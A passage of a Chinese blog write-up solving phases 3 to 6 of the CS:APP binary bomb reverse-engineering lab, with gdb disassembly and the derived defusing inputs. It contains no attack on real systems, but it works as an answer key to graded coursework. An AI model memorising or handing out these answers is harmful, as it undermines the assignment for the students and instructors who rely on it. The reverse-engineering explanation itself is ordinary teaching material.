class="line">0x400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400f83 &lt;+64&gt;:    mov    $0x2c3,%eax</span><br><span class="line">0x400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400f8a &lt;+71&gt;:    mov    $0x100,%eax</span><br><span class="line">0x400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400f91 &lt;+78&gt;:    mov    $0x185,%eax</span><br><span class="line">0x400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400f98 &lt;+85&gt;:    mov    $0xce,%eax</span><br><span class="line">0x400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400f9f &lt;+92&gt;:    mov    $0x2aa,%eax</span><br><span class="line">0x400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400fa6 &lt;+99&gt;:    mov    $0x147,%eax</span><br><span class="line">0x400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400fad &lt;+106&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x400fb2 &lt;+111&gt;:   mov    $0x0,%eax</span><br><span class="line">0x400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;</span><br><span class="line">0x400fb9 &lt;+118&gt;:   mov    $0x137,%eax</span><br><span class="line">0x400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax</span><br><span class="line">0x400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">0x400fc4 &lt;+129&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x400fc9 &lt;+134&gt;:   add    $0x18,%rsp</span><br><span class="line">0x400fcd &lt;+138&gt;:   retq</span><br></pre></td></tr></table></figure><p>首先看函数 <code>sscanf</code> 的调用：0x4025cf 地址字符串为 <code>$2 = 0x4025cf &quot;%d %d&quot;</code>，从 <code>input</code> 读取两个整数，分别存储于地址 0x8(%rsp) 和 0xc(%rsp)。</p><p><code>cmpl $0x7,0x8(%rsp)</code>  和 <code>ja 0x400fad &lt;phase_3+106&gt;</code> 表明，第一个整数的值不能超过 7。</p><p><code>jmpq *0x402470(,%rax,8)</code> 表示跳转到 <em>(0x402470 + 8 </em> %rax) 处，而 %rax 的值此时等于读取的第一个整数。假设输入的第一个整数为 0，下一个指令的地址为 0x402470，使用 <code>print /x *0x402470</code> 打印出地址的值为 0x400f7c，即指令 <code>jmpq *0x402470(,%rax,8)</code> 等同于 <code>jmpq 0x400f7c</code>。地址为 0x400f7c 的指令为 <code>mov $0xcf,%eax</code>，随后跳转到 <code>cmp 0xc(%rsp),%eax</code>，即与输入的第二个整数比较，相同时结束该函数调用。说明当输入为 0 207 时（0xcf = 207），<code>phase_3</code> 不会爆炸。</p><p>对于第 1 个整数分别为 1~7 时，其推理过程也是类似的，其结果如下表：</p><p><style type="text/css"><br>.tg  {border-collapse:collapse;border-spacing:0;border:none;border-color:#aaa;}<br>.tg td{font-family:Arial, sans-serif;font-size:14px;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-color:#aaa;color:#333;background-color:#fff;}<br>.tg th{font-family:Arial, sans-serif;font-size:14px;font-weight:normal;padding:10px 5px;border-style:solid;border-width:0px;overflow:hidden;word-break:normal;border-color:#aaa;color:#fff;background-color:#f38630;}<br>.tg .tg-vswx{background-color:#fd6864;border-color:inherit;text-align:center;vertical-align:top}<br>.tg .tg-c3ow{border-color:inherit;text-align:center;vertical-align:top}</style></p><table class="tg">  <tr>    <th class="tg-vswx">数1</th>    <th class="tg-vswx">下条指令地址</th>    <th class="tg-vswx">跳转地址</th>    <th class="tg-vswx">数2（16进制）</th>    <th class="tg-vswx">数2（10进制）</th>  </tr>  <tr>    <td class="tg-c3ow">0</td>    <td class="tg-c3ow">0x402470</td>    <td class="tg-c3ow">0x400f7c</td>    <td class="tg-c3ow">0xcf</td>    <td class="tg-c3ow">207</td>  </tr>  <tr>    <td class="tg-c3ow">1</td>    <td class="tg-c3ow">0x402478</td>    <td class="tg-c3ow">0x400fb9</td>    <td class="tg-c3ow">0x137</td>    <td class="tg-c3ow">311</td>  </tr>  <tr>    <td class="tg-c3ow">2</td>    <td class="tg-c3ow">0x402480</td>    <td class="tg-c3ow">0x400f83</td>    <td class="tg-c3ow">0x2c3</td>    <td class="tg-c3ow">707</td>  </tr>  <tr>    <td class="tg-c3ow">3</td>    <td class="tg-c3ow">0x402488</td>    <td class="tg-c3ow">0x400f8a</td>    <td class="tg-c3ow">0x100</td>    <td class="tg-c3ow">256</td>  </tr>  <tr>    <td class="tg-c3ow">4</td>    <td class="tg-c3ow">0x402490</td>    <td class="tg-c3ow">0x400f91</td>    <td class="tg-c3ow">0x185</td>    <td class="tg-c3ow">389</td>  </tr>  <tr>    <td class="tg-c3ow">5</td>    <td class="tg-c3ow">0x402498</td>    <td class="tg-c3ow">0x400f98</td>    <td class="tg-c3ow">0xce</td>    <td class="tg-c3ow">206</td>  </tr>  <tr>    <td class="tg-c3ow">6</td>    <td class="tg-c3ow">0x4024a0</td>    <td class="tg-c3ow">0x400f9f</td>    <td class="tg-c3ow">0x2aa</td>    <td class="tg-c3ow">682</td>  </tr></table><p>每对&lt;数1，数2&gt;均可作为 bomb 的第 3 组参数。</p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>调用 <code>disassemble phase_4</code> 反汇编函数 phase_4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x40100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">0x401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">0x401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">0x40101a &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">0x40101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">0x401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x401029 &lt;+29&gt;:    cmp    $0x2,%eax</span><br><span class="line">0x40102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">0x40102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)</span><br><span class="line">0x401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">0x401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x40103a &lt;+46&gt;:    mov    $0xe,%edx</span><br><span class="line">0x40103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">0x401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi</span><br><span class="line">0x401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">0x40104d &lt;+65&gt;:    test   %eax,%eax</span><br><span class="line">0x40104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;</span><br><span class="line">0x401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)</span><br><span class="line">0x401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">0x401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x40105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">0x401061 &lt;+85&gt;:    retq</span><br></pre></td></tr></table></figure><ol><li><p>首先看读入部分，相关代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x40100c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">0x401010 &lt;+4&gt;:     lea    0xc(%rsp),%rcx</span><br><span class="line">0x401015 &lt;+9&gt;:     lea    0x8(%rsp),%rdx</span><br><span class="line">0x40101a &lt;+14&gt;:    mov    $0x4025cf,%esi</span><br><span class="line">0x40101f &lt;+19&gt;:    mov    $0x0,%eax</span><br><span class="line">0x401024 &lt;+24&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x401029 &lt;+29&gt;:    cmp    $0x2,%eax</span><br><span class="line">0x40102c &lt;+32&gt;:    jne    0x401035 &lt;phase_4+41&gt;</span><br></pre></td></tr></table></figure><p>函数 sscanf 的参数一为 %rdi，存储输入 input 的地址；参数二为 %esi，使用 <code>(gdb) print （char *) 0x4025cf</code> 查看该地址的字符串，其值为 “%d %d” 表示读入两个整数；参数三为 %rdx=%rsp+0x8, 参数四为 %rcx=%rsp + %c，说明读入的两个整数分别存储于地址 %rsp+0x8 和 %rsp+0xc。</p><p>%eax 表示读入的整数数量，如果不为 2 则跳转到调用 explode_bomb 函数的指令地址。</p></li><li><p>接下来，程序准备调用函数 func4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x40102e &lt;+34&gt;:    cmpl   $0xe,0x8(%rsp)</span><br><span class="line">0x401033 &lt;+39&gt;:    jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">0x401035 &lt;+41&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x40103a &lt;+46&gt;:    mov    $0xe,%edx</span><br><span class="line">0x40103f &lt;+51&gt;:    mov    $0x0,%esi</span><br><span class="line">0x401044 &lt;+56&gt;:    mov    0x8(%rsp),%edi</span><br><span class="line">0x401048 &lt;+60&gt;:    callq  0x400fce &lt;func4&gt;</span><br></pre></td></tr></table></figure><p>0x40102e~0x401035（1~3 行）：要求读入的第一个整数必须 ≤14。</p><p>0x40103a~0x401044（4~6 行）：构造 func4 参数：第一个整数，0，14，即调用函数 func4(数一，0，14)。</p></li><li><p>处理函数 func4 的返回值：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x40104d &lt;+65&gt;:    test   %eax,%eax</span><br><span class="line">0x40104f &lt;+67&gt;:    jne    0x401058 &lt;phase_4+76&gt;</span><br></pre></td></tr></table></figure><p>如果 func4() 返回值不等于 0，则跳转并调用 explode_bomb。</p></li><li><p>处理读入的第二个整数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x401051 &lt;+69&gt;:    cmpl   $0x0,0xc(%rsp)</span><br><span class="line">0x401056 &lt;+74&gt;:    je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">0x401058 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x40105d &lt;+81&gt;:    add    $0x18,%rsp</span><br><span class="line">0x401061 &lt;+85&gt;:    retq</span><br></pre></td></tr></table></figure><p>如果<strong>数二等于 0</strong>，则跳转指令并结束；否则调用 explode_bomb。</p></li><li><p>调用 <code>disassemble func4</code> 反汇编函数 func4：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0x400fce &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">0x400fd2 &lt;+4&gt;:     mov    %edx,%eax</span><br><span class="line">0x400fd4 &lt;+6&gt;:     sub    %esi,%eax</span><br><span class="line">0x400fd6 &lt;+8&gt;:     mov    %eax,%ecx</span><br><span class="line">0x400fd8 &lt;+10&gt;:    shr    $0x1f,%ecx</span><br><span class="line">0x400fdb &lt;+13&gt;:    add    %ecx,%eax</span><br><span class="line">0x400fdd &lt;+15&gt;:    sar    %eax</span><br><span class="line">0x400fdf &lt;+17&gt;:    lea    (%rax,%rsi,1),%ecx</span><br><span class="line">0x400fe2 &lt;+20&gt;:    cmp    %edi,%ecx</span><br><span class="line">0x400fe4 &lt;+22&gt;:    jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">0x400fe6 &lt;+24&gt;:    lea    -0x1(%rcx),%edx</span><br><span class="line">0x400fe9 &lt;+27&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">0x400fee &lt;+32&gt;:    add    %eax,%eax</span><br><span class="line">0x400ff0 &lt;+34&gt;:    jmp    0x401007 &lt;func4+57&gt;</span><br><span class="line">0x400ff2 &lt;+36&gt;:    mov    $0x0,%eax</span><br><span class="line">0x400ff7 &lt;+41&gt;:    cmp    %edi,%ecx</span><br><span class="line">0x400ff9 &lt;+43&gt;:    jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">0x400ffb &lt;+45&gt;:    lea    0x1(%rcx),%esi</span><br><span class="line">0x400ffe &lt;+48&gt;:    callq  0x400fce &lt;func4&gt;</span><br><span class="line">0x401003 &lt;+53&gt;:    lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">0x401007 &lt;+57&gt;:    add    $0x8,%rsp</span><br><span class="line">0x40100b &lt;+61&gt;:    retq</span><br></pre></td></tr></table></figure><p>在第 2 步中已知 func4 的三个参数为整数，因此这里将 func4 定义为 <code>int func4(int a, int b, int c)</code>，其中 %edi = a, %esi = b, %edx = c。</p><p>0x400fd2~0x400fdf（2~8 行）：%eax = (c - b) / 2, %ecx = b + (c - b) / 2。记 m = b + (c - b) / 2，为区间 [b, c] 的中点。</p><p>0x400fe2~0x400fe4（9-10 行）：如果 %ecx &lt;= %edi（即 m &lt;= a），则跳转到 0x400ff2。</p><p>a. 不跳转时，执行 0x400fe6~0x400ff0（11~14 行）：调用并返回结果值 2 * func4(a, b, m - 1)。</p><p>b. 发生跳转，执行 0x400ff2~0x400ff9（15~17 行）：如果 %ecx &gt;= %edi（即 m &gt;= a），返回结果值 0，否咋调用并返回 2 * func(a, m + 1, c) + 1。</p><p>依据第 3 步的推论，func4(数 1, 0, 14) 的结果必须为 0，因此<strong>数一等于 7</strong>。</p></li></ol><p>因此 7 0 为 bomb 的第 4 组运行参数。</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>调用 <code>disassemble phase_5</code> 反汇编函数 phase_5</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">0x401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">0x401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">0x401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">0x40106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">0x401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">0x401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">0x40107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</span><br><span class="line">0x40107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line">0x401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">0x401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">0x40108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">0x40108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">0x401092 &lt;+48&gt;:    mov    (%rsp),%rdx</span><br><span class="line">0x401096 &lt;+52&gt;:    and    $0xf,%edx</span><br><span class="line">0x401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">0x4010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">0x4010a4 &lt;+66&gt;:    add    $0x1,%rax</span><br><span class="line">0x4010a8 &lt;+70&gt;:    cmp    $0x6,%rax</span><br><span class="line">0x4010ac &lt;+74&gt;:    jne    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">0x4010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line">0x4010b3 &lt;+81&gt;:    mov    $0x40245e,%esi</span><br><span class="line">0x4010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">0x4010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">0x4010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">0x4010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">0x4010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x4010cb &lt;+105&gt;:   nopl   0x0(%rax,%rax,1)</span><br><span class="line">0x4010d0 &lt;+110&gt;:   jmp    0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">0x4010d2 &lt;+112&gt;:   mov    $0x0,%eax</span><br><span class="line">0x4010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br><span class="line">0x4010d9 &lt;+119&gt;:   mov    0x18(%rsp),%rax</span><br><span class="line">0x4010de &lt;+124&gt;:   xor    %fs:0x28,%rax</span><br><span class="line">0x4010e7 &lt;+133&gt;:   je     0x4010ee &lt;phase_5+140&gt;</span><br><span class="line">0x4010e9 &lt;+135&gt;:   callq  0x400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x4010ee &lt;+140&gt;:   add    $0x20,%rsp</span><br><span class="line">0x4010f2 &lt;+144&gt;:   pop    %rbx</span><br><span class="line">0x4010f3 &lt;+145&gt;:   retq</span><br></pre></td></tr></table></figure><p>A. 先阅读读入部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x401062 &lt;+0&gt;:     push   %rbx</span><br><span class="line">0x401063 &lt;+1&gt;:     sub    $0x20,%rsp</span><br><span class="line">0x401067 &lt;+5&gt;:     mov    %rdi,%rbx</span><br><span class="line">0x40106a &lt;+8&gt;:     mov    %fs:0x28,%rax</span><br><span class="line">0x401073 &lt;+17&gt;:    mov    %rax,0x18(%rsp)</span><br><span class="line">0x401078 &lt;+22&gt;:    xor    %eax,%eax</span><br><span class="line">0x40107a &lt;+24&gt;:    callq  0x40131b &lt;string_length&gt;</span><br><span class="line">0x40107f &lt;+29&gt;:    cmp    $0x6,%eax</span><br><span class="line">0x401082 &lt;+32&gt;:    je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">0x401084 &lt;+34&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x401089 &lt;+39&gt;:    jmp    0x4010d2 &lt;phase_5+112&gt;</span><br></pre></td></tr></table></figure><p>寄存器 %rbx = %rdi = &amp;input，记录输入字符串的地址。</p><p>调用函数 string_length 计算输入 %rdi = &amp;input 的字符串长度，要求其长度为 6。</p><p>B. 上述代码跳转到 0x4010d2：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x4010d2 &lt;+112&gt;:   mov    $0x0,%eax</span><br><span class="line">0x4010d7 &lt;+117&gt;:   jmp    0x40108b &lt;phase_5+41&gt;</span><br></pre></td></tr></table></figure><p>该段代码将 %eax 赋值为 0，并跳转到 0x40108b。</p><p>C. 0x40108b~0x4010ac 是一个循环，循环变量为 %rax=0~5，%rbx = &amp;input。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x40108b &lt;+41&gt;:    movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">0x40108f &lt;+45&gt;:    mov    %cl,(%rsp)</span><br><span class="line">0x401092 &lt;+48&gt;:    mov    (%rsp),%rdx</span><br><span class="line">0x401096 &lt;+52&gt;:    and    $0xf,%edx</span><br></pre></td></tr></table></figure><p>上述代码取出 input 的字符，并将低 4 位赋值给 %edx，即 %edx = input[%rax] &amp; 0xf。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x401099 &lt;+55&gt;:    movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">0x4010a0 &lt;+62&gt;:    mov    %dl,0x10(%rsp,%rax,1)</span><br></pre></td></tr></table></figure><p>上述代码从地址 0x4024b0 + %rdx 取值，并存储于栈 %rsp + %rax + 16 处。</p><p>使用 <code>print (char *) 0x4024b0</code> 查看该地址的值为 “maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?” 。</p><p>该循环利用上述字符串构造了新的字符串，并存储于起始地址 %rsp + 16。</p><p>D. 第 3 步构造的字符串要与地址 0x40245e 的字符串相同。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x4010ae &lt;+76&gt;:    movb   $0x0,0x16(%rsp)</span><br><span class="line">0x4010b3 &lt;+81&gt;:    mov    $0x40245e,%esi</span><br><span class="line">0x4010b8 &lt;+86&gt;:    lea    0x10(%rsp),%rdi</span><br><span class="line">0x4010bd &lt;+91&gt;:    callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">0x4010c2 &lt;+96&gt;:    test   %eax,%eax</span><br><span class="line">0x4010c4 &lt;+98&gt;:    je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">0x4010c6 &lt;+100&gt;:   callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p>使用 <code>print (char *) 0x40245e</code> 查看字符串，其值为 “flyers”。</p><p>E. 构造字符串的第 i 个字符为 *(0x4024b0 + (input[i] &amp; 0xf))，依据 “flyers” 可反向推导 input 的值为 0x9fe567。然而 input 是作为字符串读入的，因此值 0x9fe567 要构造成可打印字符的序列。本文将每个值或（or）上 0x60，构造出序列 “ionefg”。</p><p>“ionefg” 即为 bomb 的第 5 组运行参数。</p><h3 id="phase-6"><a href="#phase-6" class="headerlink" title="phase_6"></a>phase_6</h3><p>A. 数据读入使用 read_six_numbers：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x401100 &lt;+12&gt;:    mov    %rsp,%r13</span><br><span class="line">0x401103 &lt;+15&gt;:    mov    %rsp,%rsi</span><br><span class="line">0x401106 &lt;+18&gt;:    callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">0x40110b &lt;+23&gt;:    mov    %rsp,%r14</span><br></pre></td></tr></table></figure><p>在 phase_2 已知 read_six_numbes 读取六个整数，依次存储于 %rsi, %rsi + 4, …, %rsi + 20。</p><p>定义 <code>int a[6]</code>，其中 a = %rsi，则六个整数可表示为 a[0], a[1], …, a[5]。</p><p>B. 二重循环检测六个整数的大小关系，要求<strong>两两不同</strong>且每个数不能大于 6。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x401114 &lt;+32&gt;:    mov    %r13,%rbp</span><br><span class="line">...</span><br><span class="line">0x40114d &lt;+89&gt;:    add    $0x4,%r13</span><br><span class="line">0x401151 &lt;+93&gt;:    jmp    0x401114 &lt;phase_6+32&gt;</span><br></pre></td></tr></table></figure><p>寄存器 %r13 为外层循环指针，依次指向 &amp;a[0], &amp;a[1], …, &amp;a[5]。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x40110e &lt;+26&gt;:    mov    $0x0,%r12d</span><br><span class="line">...</span><br><span class="line">0x401128 &lt;+52&gt;:    add    $0x1,%r12d</span><br><span class="line">0x40112c &lt;+56&gt;:    cmp    $0x6,%r12d</span><br><span class="line">0x401130 &lt;+60&gt;:    je     0x401153 &lt;phase_6+95&gt;</span><br><span class="line">0x401132 &lt;+62&gt;:    mov    %r12d,%ebx</span><br></pre></td></tr></table></figure><p>寄存器 %r12 为外层循环下标，依次赋值为 0, 1, …, 5。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x401132 &lt;+62&gt;:    mov    %r12d,%ebx</span><br><span class="line">0x401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">...</span><br><span class="line">0x401145 &lt;+81&gt;:    add    $0x1,%ebx</span><br><span class="line">0x401148 &lt;+84&gt;:    cmp    $0x5,%ebx</span><br><span class="line">0x40114b &lt;+87&gt;:    jle    0x401135 &lt;phase_6+65&gt;</span><br></pre></td></tr></table></figure><p>寄存器 %ebx 为内层循环下标。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x401117 &lt;+35&gt;:    mov    0x0(%r13),%eax# %eax = a[i]</span><br><span class="line">0x40111b &lt;+39&gt;:    sub    $0x1,%eax</span><br><span class="line">0x40111e &lt;+42&gt;:    cmp    $0x5,%eax</span><br><span class="line">0x401121 &lt;+45&gt;:    jbe    0x401128 &lt;phase_6+52&gt;</span><br><span class="line">0x401123 &lt;+47&gt;:    callq  0x40143a &lt;explode_bomb&gt;# bomb if a[i] &gt; 6</span><br></pre></td></tr></table></figure><p>上述代码检查 a[i] - 1 &lt;= 5 是否满足，不满足则调用 explode_bomb。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x401135 &lt;+65&gt;:    movslq %ebx,%rax</span><br><span class="line">0x401138 &lt;+68&gt;:    mov    (%rsp,%rax,4),%eax# %eax = a[j]</span><br><span class="line">0x40113b &lt;+71&gt;:    cmp    %eax,0x0(%rbp)</span><br><span class="line">0x40113e &lt;+74&gt;:    jne    0x401145 &lt;phase_6+81&gt;</span><br><span class="line">0x401140 &lt;+76&gt;:    callq  0x40143a &lt;explode_bomb&gt;# bomb if a[i] == a[j]</span><br></pre></td></tr></table></figure><p>%ebx 为内层循环下标，因此 %eax = a[j]。</p><p>%rsp = %r13 为外层循环指针，因此 cmp 指令比较 a[i], a[j]。</p><p>上述代码检测 a[i] != a[j]，不满足则调用 explode_bomb。</p><p>C. 更新 a[i] = 7 - a[i]。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x401153 &lt;+95&gt;:    lea    0x18(%rsp),%rsi# 循环上界 %rsp + 24</span><br><span class="line">0x401158 &lt;+100&gt;:   mov    